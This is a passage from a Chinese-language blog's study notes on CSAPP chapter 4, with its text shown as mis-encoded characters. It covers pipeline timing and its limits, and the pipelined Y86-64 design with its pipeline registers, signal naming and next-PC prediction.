ï¼ˆåªæ˜¯ç”¨äºä¸¾ä¾‹çš„è®¡ç®—ï¼Œå¹¶ä¸æ˜¯å®é™…è¿‡ç¨‹ä¸­å®ç°éœ€è¦çš„æ—¶é—´ï¼‰</p><h3 id="æµæ°´çº¿æ“ä½œçš„è¯¦ç»†è¯´æ˜"><a href="#æµæ°´çº¿æ“ä½œçš„è¯¦ç»†è¯´æ˜" class="headerlink" title="æµæ°´çº¿æ“ä½œçš„è¯¦ç»†è¯´æ˜"></a>æµæ°´çº¿æ“ä½œçš„è¯¦ç»†è¯´æ˜</h3><p>å°±åƒä¸Šé¢çš„æµæ°´çº¿åŒ–çš„ç¨‹åºï¼ŒæŠŠæŒ‡ä»¤åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼ŒåŒä¸€æ—¶é—´å¯èƒ½å°±ä¼šæœ‰ä¸‰æ¡æŒ‡ä»¤ç»è¿‡ä¸åŒçš„é˜¶æ®µï¼Œæ¯”å¦‚ 240-360ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%8C%BA%E5%88%86.png"></p><p>ä¸‹é¢æˆ‘ä»¬è·Ÿè¸ªäº†ç›¸åº”çš„ç”µè·¯æ´»åŠ¨</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%97%B6%E9%92%9F%E5%91%A8%E6%9C%9F.png"></p><p>åœ¨æ—¶åˆ» 240ï¼ˆç‚¹ 1ï¼‰æ—¶é’Ÿä¸Šå‡ä¹‹å‰ï¼ŒæŒ‡ä»¤ I1 å’ŒI2 å·²ç»å®Œæˆäº†é˜¶æ®µ B å’Œ A ï¼Œé˜¶æ®µAä¸­è®¡ç®—çš„æŒ‡ä»¤ I2 çš„å€¼å·²ç»åˆ°è¾¾ç¬¬ä¸€ä¸ªæµæ°´çº¿å¯„å­˜å™¨çš„è¾“å…¥ï¼Œä½†æ˜¯è¯¥å¯„å­˜å™¨çš„çŠ¶æ€å’Œè¾“å‡ºè¿˜ä¿æŒä¸ºæŒ‡ä»¤Ilåœ¨é˜¶æ®µAä¸­è®¡ç®—çš„å€¼ã€‚åœ¨æ—¶é’Ÿä¸Šå‡åï¼Œè¿™äº›æŒ‡ä»¤å¼€å§‹ä¼ é€åˆ°é˜¶æ®µ C å’Œ Bï¼Œè€ŒæŒ‡ä»¤ I3 å¼€å§‹ç»è¿‡é˜¶æ®µ Aï¼ˆç‚¹ 2 å’Œ 3ï¼‰ã€‚å°±åƒå›¾ä¸­ç‚¹ 3 å¤„çš„æ›²çº¿åŒ–çš„æ³¢é˜µé¢ï¼ˆcurved wavefrontï¼‰è¡¨æ˜çš„é‚£æ ·ï¼Œä¿¡å·å¯èƒ½ä»¥ä¸åŒçš„é€Ÿç‡é€šè¿‡å„ä¸ªä¸åŒçš„éƒ¨åˆ†ã€‚åœ¨æ—¶åˆ» 360 ä¹‹å‰ï¼Œç»“æœå€¼åˆ°è¾¾æµæ°´çº¿å¯„å­˜å™¨çš„è¾“å…¥ï¼ˆç‚¹4ï¼‰ã€‚å½“æ—¶åˆ» 360 æ—¶é’Ÿä¸Šå‡æ—¶ï¼Œå„æ¡æŒ‡ä»¤ä¼šå‰è¿›ç»è¿‡ä¸€ä¸ªæµæ°´çº¿é˜¶æ®µã€‚</p><p>ä»è¿™ä¸ªå¯¹æµæ°´çº¿æ“ä½œè¯¦ç»†çš„æè¿°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ç¼“æ—¶é’Ÿä¸ä¼šå½±å“æµæ°´çº¿çš„è¡Œä¸ºã€‚ä¿¡å·ä¼ æ’­åˆ°æµæ°´çº¿å¯„å­˜å™¨çš„è¾“å…¥ï¼Œä½†æ˜¯ç›´åˆ°æ—¶é’Ÿä¸Šå‡æ—¶æ‰ä¼šæ”¹å˜å¯„å­˜å™¨çš„çŠ¶æ€ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæ—¶é’Ÿè¿è¡Œå¾—å¤ªå¿«ï¼Œå°±ä¼šæœ‰ç¾éš¾æ€§çš„åæœã€‚å€¼å¯èƒ½ä¼šæ¥ä¸åŠé€šè¿‡ç»„åˆé€»è¾‘ï¼Œå› æ­¤å½“æ—¶é’Ÿä¸Šå‡æ—¶ï¼Œå¯„å­˜å™¨çš„è¾“äººè¿˜ä¸æ˜¯åˆæ³•çš„å€¼ã€‚</p><h3 id="æµæ°´çº¿çš„å±€é™æ€§"><a href="#æµæ°´çº¿çš„å±€é™æ€§" class="headerlink" title="æµæ°´çº¿çš„å±€é™æ€§"></a>æµæ°´çº¿çš„å±€é™æ€§</h3><p>åœ¨æˆ‘ä»¬ç†æƒ³çš„æµæ°´çº¿åŒ–ç³»ç»Ÿä¸­ï¼Œå„éƒ¨åˆ†ç›¸äº’ç‹¬ç«‹ï¼Œæ¯ä¸ªéƒ¨åˆ†æ‰€éœ€çš„æ—¶é—´éƒ½æ˜¯ç›¸åŒï¼Œä½†å®é™…æƒ…å†µä¸­ä¼šæœ‰ä¸€äº›å› ç´ æ¥é™ä½æµæ°´çº¿çš„æ•ˆç‡ã€‚</p><h4 id="ä¸ä¸€è‡´çš„åˆ’åˆ†"><a href="#ä¸ä¸€è‡´çš„åˆ’åˆ†" class="headerlink" title="ä¸ä¸€è‡´çš„åˆ’åˆ†"></a>ä¸ä¸€è‡´çš„åˆ’åˆ†</h4><p>æ¯ä¸€é˜¶æ®µçš„æ—¶é—´ä¸æ˜¯æ­£å¥½ç›¸åŒï¼Œå°±æ˜¯é™ä½æ•ˆç‡çš„åŸå› ä¹‹ä¸€ã€‚æ¯”å¦‚ä¸‹æ–¹ç¨‹åºè¢«åˆ†ä¸ºä¸‰ä¸ªä¸åŒçš„é˜¶æ®µï¼Œä½†é€šè¿‡è¿™äº›é˜¶æ®µçš„å»¶è¿Ÿä» 50ps åˆ° 150ps ä¸ç­‰ã€‚é€šè¿‡æ‰€æœ‰é˜¶æ®µçš„å»¶è¿Ÿå’Œä»ç„¶ä¸º300psã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E5%88%92%E5%88%86.png"></p><p>ä¸è¿‡ï¼Œè¿è¡Œæ—¶é’Ÿçš„é€Ÿç‡æ˜¯ç”±æœ€æ…¢çš„é˜¶æ®µçš„å»¶è¿Ÿé™åˆ¶çš„ã€‚æµæ°´çº¿å›¾è¡¨æ˜ï¼Œæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œé˜¶æ®µAéƒ½ä¼šç©ºé—²ï¼ˆç”¨ç™½è‰²æ–¹æ¡†è¡¨ç¤ºï¼‰100psï¼Œè€Œé˜¶æ®µCä¼šç©ºé—² 50ps ã€‚åªæœ‰é˜¶æ®µBä¼šä¸€ç›´å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚æˆ‘ä»¬å¿…é¡»å°†æ—¶é’Ÿå‘¨æœŸè®¾ä¸º150+20&#x3D;170psï¼Œå¾—åˆ°ååé‡ä¸º5.88GIPSã€‚å¦å¤–ï¼Œç”±äºæ—¶é’Ÿå‘¨æœŸå‡æ…¢ï¼Œå»¶è¿Ÿå¢åŠ åˆ°äº† 510psã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹ç¡¬ä»¶è®¾è®¡è€…æ¥è¯´ï¼Œå°†æŒ‡ä»¤è¿‡ç¨‹è¿›è¡Œç­‰åˆ†æ˜¯å¾ˆå›°éš¾çš„ã€‚é€šå¸¸ï¼Œå¤„ç†å™¨ä¸­çš„æŸäº›ç¡¬ä»¶å•å…ƒï¼Œå¦‚ALUå’Œå†…å­˜ï¼Œæ˜¯ä¸èƒ½è¢«åˆ’åˆ†æˆå¤šä¸ªå»¶è¿Ÿè¾ƒå°çš„å•å…ƒçš„ã€‚è¿™å°±ä½¿å¾—åˆ›å»ºä¸€ç»„å¹³è¡¡çš„é˜¶æ®µéå¸¸å›°éš¾</p><h4 id="æµæ°´çº¿è¿‡æ·±ï¼Œæ”¶ç›Šåè€Œä¸‹é™"><a href="#æµæ°´çº¿è¿‡æ·±ï¼Œæ”¶ç›Šåè€Œä¸‹é™" class="headerlink" title="æµæ°´çº¿è¿‡æ·±ï¼Œæ”¶ç›Šåè€Œä¸‹é™"></a>æµæ°´çº¿è¿‡æ·±ï¼Œæ”¶ç›Šåè€Œä¸‹é™</h4><p>æˆ‘ä»¬åœ¨è¿™é‡Œåˆ’åˆ†äº† 50ps ä¸€ä¸ªé˜¶æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰€éœ€æœ€å°æ—¶é’Ÿå‘¨æœŸä¸º 70psï¼Œæ¯”èµ·åˆ’åˆ†ä¸º 100ps ä¸€ä¸ªé˜¶æ®µï¼Œæ€§èƒ½æé«˜äº† 120&#x2F;70&#x3D;1.71 å€çš„æ•ˆç‡ï¼Œè™½ç„¶æˆ‘ä»¬å°†åˆ’åˆ†çš„<strong>é˜¶æ®µæ—¶é•¿å‡å°åˆ°äº†äºŒåˆ†ä¹‹ä¸€ï¼Œä½†æ˜¯æ•ˆç‡ç¡®æ²¡æœ‰æé«˜ 2 å€</strong>ï¼Œä¸»è¦æ˜¯æµæ°´çº¿å¯„å­˜å™¨äº§ç”Ÿçš„å»¶è¿Ÿã€‚å¦‚å›¾è¿™ç§æƒ…å†µï¼Œæµæ°´çº¿å¯„å­˜å™¨çš„å»¶è¿Ÿå åˆ°äº† 28.6%ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%BB%B6%E8%BF%9F.png"></p><p>è®¸å¤šç°ä»£çš„å¤„ç†å™¨éƒ½é‡‡ç”¨äº†å¾ˆæ·±çš„æµæ°´çº¿ï¼ˆ15 æˆ–è€…æ›´å¤šï¼‰ï¼Œå®ƒä»¬æŠŠä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œåˆ†æˆå¾ˆå¤šç®€å•çš„æ­¥éª¤ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ¯ä¸ªé˜¶æ®µçš„å»¶è¿Ÿå°±å¾ˆå°ã€‚</p><h3 id="å¾…åé¦ˆçš„æµæ°´çº¿ç³»ç»Ÿ"><a href="#å¾…åé¦ˆçš„æµæ°´çº¿ç³»ç»Ÿ" class="headerlink" title="å¾…åé¦ˆçš„æµæ°´çº¿ç³»ç»Ÿ"></a>å¾…åé¦ˆçš„æµæ°´çº¿ç³»ç»Ÿ</h3><p>åœ¨å®é™…çš„ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬çš„æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¸æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œæ¯”å¦‚ï¼š <code>irmovq $50,%rax; addq %rax,%rbx</code> è¿™ä¸¤å¥ä»£ç ä¹‹é—´çš„ rax å°±åœ¨ä¼ é€’ã€‚</p><p>å¦‚æœåªæ˜¯é‡‡ç”¨æœ€æ™®é€šçš„æµæ°´çº¿å°±ä¼šå‘ç”Ÿå¼‚å¸¸ï¼Œåœ¨ç¬¬ä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œé˜¶æ®µï¼Œå¯èƒ½ç¬¬äºŒæ¡æŒ‡ä»¤æ­£åœ¨è¯‘ç ï¼Œéœ€è¦å»ç­‰å¾…ç¬¬ä¸€æ¡æŒ‡ä»¤ %rax çš„æœ€ç»ˆç»“æœï¼Œç›´åˆ°ç¬¬ä¸€æ¡æŒ‡ä»¤å†™å›æ‰æ›´æ–° %rax å¯„å­˜å™¨ï¼Œæ­¤æ—¶ç¬¬äºŒæ¡æŒ‡ä»¤å·²ç»è¿‡äº†æ‰§è¡Œé˜¶æ®µäº†ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%A6%E5%8F%8D%E9%A6%88%E7%9A%84%E6%B5%81%E6%B0%B4%E7%BA%BF.png"></p><p>æ­¤æ—¶æˆ‘ä»¬å¼•å…¥å¸¦åé¦ˆçš„æµæ°´çº¿ï¼Œå¸¦éœ€è¦æ³¨æ„ï¼Œç”±äºæµæ°´çº¿æ”¹å˜äº†ç³»ç»Ÿçš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¿…é¡»æ­£ç¡®å¤„ç†åé¦ˆçš„å½±å“ã€‚</p><p>åƒä¸Šå›¾é‚£æ ·æ”¹å˜ç³»ç»Ÿçš„è¡Œä¸ºæ˜¯ä¸å¯æ¥å—çš„ã€‚æˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼æ¥å¤„ç†æŒ‡ä»¤é—´çš„æ•°æ®å’Œæ§åˆ¶ç›¸å…³ï¼Œä»¥ä½¿å¾—åˆ°çš„è¡Œä¸ºä¸ ISA å®šä¹‰çš„æ¨¡å‹ç›¸ç¬¦ã€‚</p><h1 id="Y86-64-çš„æµæ°´çº¿å®ç°"><a href="#Y86-64-çš„æµæ°´çº¿å®ç°" class="headerlink" title="Y86-64 çš„æµæ°´çº¿å®ç°"></a>Y86-64 çš„æµæ°´çº¿å®ç°</h1><p>é¦–å…ˆï¼Œå¯¹é¡ºåºçš„SEQå¤„ç†å™¨åšä¸€ç‚¹å°çš„æ”¹åŠ¨ï¼Œå°†PCçš„è®¡ç®—æŒªåˆ°å–æŒ‡é˜¶æ®µã€‚ç„¶åï¼Œåœ¨å„ä¸ªé˜¶æ®µä¹‹é—´åŠ ä¸Šæµæ°´çº¿å¯„å­˜å™¨ã€‚åœ¨æ­¤åŸºç¡€ä¸Šåšä¸€äº›ä¿®æ”¹ï¼Œå°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®æ ‡â€”â€”ä¸€ä¸ªé«˜æ•ˆçš„ã€æµæ°´çº¿åŒ–çš„å®ç° Y86-64 ISA çš„å¤„ç†å™¨ã€‚</p><h3 id="SEQ-ï¼šé‡æ–°å®‰æ’è®¡ç®—é˜¶æ®µ"><a href="#SEQ-ï¼šé‡æ–°å®‰æ’è®¡ç®—é˜¶æ®µ" class="headerlink" title="SEQ+ï¼šé‡æ–°å®‰æ’è®¡ç®—é˜¶æ®µ"></a>SEQ+ï¼šé‡æ–°å®‰æ’è®¡ç®—é˜¶æ®µ</h3><p>æˆ‘ä»¬è¦è°ƒæ•´ä¸€ä¸‹ AEQ ä¸­äº”ä¸ªé˜¶æ®µçš„é¡ºåºï¼Œä½¿æ›´æ–° PC é˜¶æ®µåœ¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå¼€å§‹æ—¶è¿›è¡Œï¼Œä»è€Œè®¡ç®—å½“å‰æŒ‡ä»¤çš„ PC å€¼ï¼Œè€Œä¸æ˜¯ç»“æŸæ—¶æ‰§è¡Œã€‚ è°ƒæ•´åçš„è®¾è®¡ç§°ä¸º SQE+ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+PC.png"></p><p>æˆ‘ä»¬åˆ›å»º<strong>çŠ¶æ€å¯„å­˜å™¨</strong>æ¥ä¿å­˜åœ¨ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­è®¡ç®—å‡ºæ¥çš„ä¿¡å·ï¼Œè¿™ç§æ”¹è¿›ç§°ä¸ºç”µè·¯é‡å®šæ—¶ï¼ˆcircuit retimingï¼‰ã€‚é‡å®šæ—¶æ”¹å˜äº†ä¸€ä¸ªç³»ç»Ÿçš„çŠ¶æ€è¡¨ç¤ºï¼Œä½†æ˜¯å¹¶ä¸æ”¹å˜å®ƒçš„é€»è¾‘è¡Œä¸ºã€‚é€šå¸¸ç”¨å®ƒæ¥å¹³è¡¡ä¸€ä¸ªæµæ°´çº¿ç³»ç»Ÿä¸­å„ä¸ªé˜¶æ®µä¹‹é—´çš„å»¶è¿Ÿã€‚</p><blockquote><p>SEQ+ä¸ä¼šæœ‰ç¡¬ä»¶å¯„å­˜å™¨æ¥å­˜æ”¾ PCï¼Œè€Œæ˜¯æ ¹æ®å‰ä¸€æ¡æŒ‡ä»¤ä¿å­˜ä¸‹æ¥çš„ä¸€äº›çŠ¶æ€ä¿¡æ¯åŠ¨æ€åœ°è®¡ç®— PC</p></blockquote><h3 id="æ’å…¥æµæ°´çº¿å¯„å­˜å™¨"><a href="#æ’å…¥æµæ°´çº¿å¯„å­˜å™¨" class="headerlink" title="æ’å…¥æµæ°´çº¿å¯„å­˜å™¨"></a>æ’å…¥æµæ°´çº¿å¯„å­˜å™¨</h3><p>å¦‚ä¸‹å›¾ä¸º SEQ+ çš„ç¡¬ä»¶ç»“æ„ï¼Œæˆ‘ä»¬è¦åœ¨æ­¤åŸºç¡€ä¸Šæ’å…¥æµæ°´çº¿å¯„å­˜å™¨ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+%E7%A1%AC%E4%BB%B6.png"></p><p>æˆ‘ä»¬æ’å…¥æµæ°´çº¿å¯„å­˜å™¨åå¾—åˆ° PIPE- æ¶æ„ï¼Œå…¶ä¸­ç°è‰²åº•è‰²çš„æ¡†æ¡†å†…å°±æ˜¯æµæ°´çº¿å¯„å­˜å™¨ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ-%E7%A1%AC%E4%BB%B6.png"></p><p>æµæ°´çº¿å¯„å­˜å™¨æŒ‰å¦‚ä¸‹æ–¹å¼æ ‡å·ï¼š</p><ul><li>Fï¼ˆFetch Codeï¼‰ä¿å­˜ç¨‹åºè®¡æ•°å™¨çš„é¢„æµ‹å€¼ã€‚</li><li>Dï¼ˆDecodeï¼‰ä½äºå–æŒ‡å’Œè¯‘ç é˜¶æ®µä¹‹é—´ã€‚å®ƒä¿å­˜å…³äºæœ€æ–°å–å‡ºçš„æŒ‡ä»¤çš„ä¿¡æ¯ï¼Œå³å°†ç”±è¯‘ç é˜¶æ®µè¿›è¡Œå¤„ç†ã€‚</li><li>Eï¼ˆExecuteï¼‰ä½äºè¯‘ç å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´ã€‚å®ƒä¿å­˜å…³äºæœ€æ–°è¯‘ç çš„æŒ‡ä»¤å’Œä»å¯„å­˜å™¨æ–‡ä»¶è¯»å‡ºçš„å€¼çš„ä¿¡æ¯ï¼Œå³å°†ç”±æ‰§è¡Œé˜¶æ®µè¿›è¡Œå¤„ç†ã€‚</li><li>Mï¼ˆMemory Accessï¼‰ä½äºæ‰§è¡Œå’Œè®¿å­˜é˜¶æ®µä¹‹é—´ã€‚å®ƒä¿å­˜æœ€æ–°æ‰§è¡Œçš„æŒ‡ä»¤çš„ç»“æœï¼Œå³å°†ç”±è®¿å­˜é˜¶æ®µè¿›è¡Œå¤„ç†ã€‚å®ƒè¿˜ä¿å­˜å…³äºç”¨äºå¤„ç†æ¡ä»¶è½¬ç§»çš„åˆ†æ”¯æ¡ä»¶å’Œåˆ†æ”¯ç›®æ ‡çš„ä¿¡æ¯ã€‚</li><li>Wï¼ˆWrite Backï¼‰ä½äºè®¿å­˜é˜¶æ®µå’Œåé¦ˆè·¯å¾„ä¹‹é—´ï¼Œåé¦ˆè·¯å¾„å°†è®¡ç®—å‡ºæ¥çš„å€¼æä¾›ç»™å¯„å­˜å™¨æ–‡ä»¶å†™ï¼Œè€Œå½“å®ŒæˆretæŒ‡ä»¤æ—¶ï¼Œå®ƒè¿˜è¦å‘PCé€‰æ‹©é€»è¾‘æä¾›è¿”å›åœ°å€ã€‚</li></ul><p>ä¸‹é¢çš„ä»£ç å°±è§£é‡Šäº†æµæ°´çº¿çš„æ­¥éª¤ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%AF%84%E5%AD%98%E5%99%A8%E6%B5%81%E7%A8%8B.png"></p><h3 id="å¯¹å‹å·è¿›è¡Œé‡æ–°æ’åˆ—å’Œæ ‡å·"><a href="#å¯¹å‹å·è¿›è¡Œé‡æ–°æ’åˆ—å’Œæ ‡å·" class="headerlink" title="å¯¹å‹å·è¿›è¡Œé‡æ–°æ’åˆ—å’Œæ ‡å·"></a>å¯¹å‹å·è¿›è¡Œé‡æ–°æ’åˆ—å’Œæ ‡å·</h3><p>é¡ºåºå®ç° SEQ å’Œ SEQ+ åœ¨ä¸€ä¸ªæ—¶åˆ»åªå¤„ç†ä¸€æ¡æŒ‡ä»¤ï¼Œå› æ­¤è¯¸å¦‚ valcã€srcA å’Œ valE è¿™æ ·çš„ä¿¡å·å€¼æœ‰å”¯ä¸€çš„å€¼ã€‚ä½†åœ¨æµæ°´çº¿åŒ–çš„è®¾è®¡ä¸­ï¼Œä¸å„ä¸ªæŒ‡ä»¤ç›¸å…³è”çš„è¿™äº›å€¼æœ‰å¤šä¸ªç‰ˆæœ¬ï¼Œä¼šéšç€æŒ‡ä»¤ä¸€èµ·æµè¿‡ç³»ç»Ÿã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ PIPE- çš„è¯¦ç»†ç»“æ„ä¸­ï¼Œæœ‰4 ä¸ªæ ‡å·ä¸º â€œStatâ€ çš„ç™½è‰²æ–¹æ¡†ï¼Œä¿å­˜ç€ 4 æ¡ä¸åŒæŒ‡ä»¤çš„çŠ¶æ€ç ã€‚æˆ‘ä»¬éœ€è¦å¾ˆå°å¿ƒä»¥ç¡®ä¿ä½¿ç”¨çš„æ˜¯æ­£ç¡®ç‰ˆæœ¬çš„ä¿¡å·ã€‚æˆ‘ä»¬é‡‡ç”¨çš„å‘½åæœºåˆ¶ï¼Œæ˜¯<strong>åœ¨ä¿¡å·åå‰é¢åŠ ä¸Šå¤§å†™çš„æµæ°´çº¿å¯„å­˜åå­—ä½œä¸ºå‰ç¼€</strong>ï¼Œå­˜å‚¨åœ¨æµæ°´çº¿å¯„å­˜å™¨ä¸­çš„ä¿¡å·å°±å¯ä»¥è¢«å”¯ä¸€åœ°æ ‡è¯†ã€‚</p><blockquote><p>åœ¨å‘½åç³»ç»Ÿä¸­,</p><p>å¤§å†™çš„å‰ç¼€ â€œDâ€ã€â€Eâ€ã€â€Mâ€ å’Œ â€œWâ€ æŒ‡çš„æµæ°´çº¿å¯„å­˜å™¨ï¼Œæ‰€ä»¥ M_stat æŒ‡çš„æ˜¯æµæ°´çº¿å¯„å­˜å™¨ Mçš„çŠ¶æ€ç å­—æ®µã€‚</p><p>å°å†™çš„å‰ç¼€â€ fâ€ã€â€dâ€ã€â€eâ€ã€â€mâ€ å’Œ â€œwâ€ æŒ‡çš„æ˜¯æµæ°´çº¿é˜¶æ®µï¼Œæ‰€ä»¥ m_stat æŒ‡çš„æ˜¯åœ¨è®¿å­˜é˜¶æ®µä¸­ç”±æ§åˆ¶é€»è¾‘å—äº§ç”Ÿå‡ºçš„çŠ¶æ€ä¿¡å·ã€‚</p></blockquote><p>PIPE- ä¸­æœ‰ä¸€ä¸ªå—åœ¨ç›¸åŒè¡¨ç¤ºå½¢å¼çš„ SEQ+ ä¸­æ˜¯æ²¡æœ‰çš„ï¼Œé‚£å°±æ˜¯è¯‘ç é˜¶æ®µä¸­æ ‡å·ä¸º <code>SelectA</code> çš„å—ã€‚æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªå—ä¼šä»æ¥è‡ªæµæ°´çº¿å¯„å­˜å™¨ D çš„ valP æˆ–ä»å¯„å­˜å™¨æ–‡ä»¶ A ç«¯å£ä¸­è¯»å‡ºçš„å€¼ä¸­é€‰æ‹©ä¸€ä¸ªï¼Œä½œä¸ºæµæ°´çº¿å¯„å­˜å™¨ Eçš„å€¼ valA ã€‚</p><p>è¿™ä¸ªå—æ˜¯ä¸ºäº†å‡å°‘è¦æºå¸¦ç»™æµæ°´çº¿å¯„å­˜å™¨ E å’Œ M çš„çŠ¶æ€æ•°é‡ã€‚åœ¨æ‰€æœ‰çš„æŒ‡ä»¤ä¸­ï¼Œåªæœ‰ call åœ¨è®¿å­˜é˜¶æ®µéœ€è¦ valP çš„å€¼ï¼ˆå‹å…¥ä¸‹ä¸€ä¸ªPCï¼‰ã€‚åªæœ‰è·³è½¬æŒ‡ä»¤åœ¨æ‰§è¡Œé˜¶æ®µï¼ˆå½“ä¸éœ€è¦è¿›è¡Œè·³è½¬æ—¶ï¼‰éœ€è¦ valP çš„å€¼ã€‚è€Œè¿™äº›æŒ‡ä»¤åˆéƒ½ä¸éœ€è¦ä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»å‡ºçš„å€¼ã€‚</p><p>å› æ­¤æˆ‘ä»¬åˆå¹¶è¿™ä¸¤ä¸ªä¿¡å·ï¼Œå°†å®ƒä»¬ä½œä¸ºä¿¡å· valA æºå¸¦ç©¿è¿‡æµæ°´çº¿ï¼Œä»è€Œå¯ä»¥å‡å°‘æµæ°´çº¿å¯„å­˜å™¨çš„çŠ¶æ€æ•°é‡ã€‚è¿™æ ·åšå°±æ¶ˆé™¤äº† SEQï¼ˆå›¾4-23ï¼‰å’ŒSEQ+ï¼ˆå›¾4-40ï¼‰ä¸­æ ‡å·ä¸º Data çš„å—ï¼Œè¿™ä¸ªå—å®Œæˆçš„æ˜¯ç±»ä¼¼çš„åŠŸèƒ½ã€‚</p><h3 id="é¢„æµ‹ä¸‹ä¸€ä¸ªPC"><a href="#é¢„æµ‹ä¸‹ä¸€ä¸ªPC" class="headerlink" title="é¢„æµ‹ä¸‹ä¸€ä¸ªPC"></a>é¢„æµ‹ä¸‹ä¸€ä¸ªPC</h3><p>æµæ°´çº¿åŒ–è®¾è®¡çš„ç›®çš„å°±æ˜¯æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸéƒ½å‘å°„ä¸€æ¡æ–°æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸéƒ½æœ‰ä¸€æ¡æ–°æŒ‡ä»¤è¿›å…¥æ‰§è¡Œé˜¶æ®µå¹¶æœ€ç»ˆå®Œæˆã€‚è¦è¾¾åˆ°è¿™ä¸ªç›®çš„ååé‡å¿…é¡»è¦æ˜¯æ˜¯æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸä¸€æ¡æŒ‡ä»¤ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨å–å‡ºå½“å‰æŒ‡ä»¤ä¹‹åï¼Œé©¬ä¸Šç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ã€‚</p><p>å¦‚æœå–å‡ºçš„æŒ‡ä»¤æ˜¯æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ï¼Œè¦åˆ°æŒ‡ä»¤é€šè¿‡æ‰§è¡Œé˜¶æ®µä¹‹åï¼Œæˆ‘ä»¬æ‰èƒ½çŸ¥é“æ˜¯å¦è¦é€‰æ‹©åˆ†æ”¯ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœå–å‡ºçš„æŒ‡ä»¤æ˜¯ retï¼Œè¦åˆ°æŒ‡ä»¤é€šè¿‡è®¿å­˜é˜¶æ®µï¼Œæ‰èƒ½ç¡®å®šè¿”å›åœ°å€ã€‚</p><p>ä½†æ˜¯é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬éƒ½èƒ½åœ¨å–æŒ‡é˜¶æ®µç»“æŸåé©¬ä¸ŠçŸ¥é“ä¸‹ä¸€è·³æŒ‡ä»¤çš„åœ°å€ï¼Œ<strong>å¯¹äºæ— æ¡ä»¶è·³è½¬æ¥è¯´ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ˜¯æŒ‡ä»¤ä¸­çš„ä¸€ä¸ªå¸¸æ•° valCï¼Œå¯¹äºå…¶ä»–æŒ‡ä»¤æ¥è¯´å°±æ˜¯ valPã€‚å¯¹äºæ¡ä»¶è·³è½¬æŒ‡ä»¤æ¥è¯´ï¼Œå¦‚æœé€‰æ‹©äº†è·³è½¬ï¼Œé‚£ä¹ˆ PC æ–°çš„å€¼åº”å½“æ˜¯ valCï¼Œå¦‚æœé€‰æ‹©ä¸è·³è½¬ï¼Œé‚£ä¹ˆ PC æ–°çš„å€¼åº”å½“æ˜¯ valPã€‚</strong></p><h3 id="æµæ°´çº¿å†’é™©"><a href="#æµæ°´çº¿å†’é™©" 